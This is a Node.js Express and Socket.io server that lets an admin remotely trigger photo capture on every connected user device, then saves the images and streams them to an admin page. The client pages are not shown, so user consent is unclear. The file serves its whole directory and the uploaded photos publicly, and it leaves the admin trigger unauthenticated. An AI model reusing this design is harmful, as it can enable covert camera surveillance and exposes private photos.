const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Folder setup for local storage
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}

// Serve public directory AND root directory for HTML files
app.use(express.static(__dirname));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(uploadDir));

// Explicit routes so /admin.html and /user.html always load correctly
app.get('/admin.html', (req, res) => {
    const adminPath = fs.existsSync(path.join(__dirname, 'public', 'admin.html'))
        ? path.join(__dirname, 'public', 'admin.html')
        : path.join(__dirname, 'admin.html');
    res.sendFile(adminPath);
});

app.get('/user.html', (req, res) => {
    const userPath = fs.existsSync(path.join(__dirname, 'public', 'user.html'))
        ? path.join(__dirname, 'public', 'user.html')
        : path.join(__dirname, 'user.html');
    res.sendFile(userPath);
});

// Root route (Redirects to user page by default)
app.get('/', (req, res) => {
    res.redirect('/user.html');
});

io.on('connection', (socket) => {
    console.log('⚡ Connected Device ID:', socket.id);

    // Admin manual button trigger
    socket.on('admin-trigger-capture', () => {
        io.emit('capture-photo');
    });

    // Receive photo from user & process
    socket.on('user-photo-captured', (imageData) => {
        const base64Data = imageData.replace(/^data:image\/png;base64,/, "");
        const fileName = `photo_${Date.now()}.png`;
        const filePath = path.join(uploadDir, fileName);

        // Auto Save to disk
        fs.writeFile(filePath, base64Data, 'base64', (err) => {
            if (!err) console.log(`✅ Photo Auto-Saved: uploads/${fileName}`);
        });

        // Broadcast to Admin live UI
        io.emit('send-photo-to-admin', imageData);
    });
});

// Use Render's PORT or fallback to 3000
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`\n🚀 SERVER RUNNING on port ${PORT}!`);
});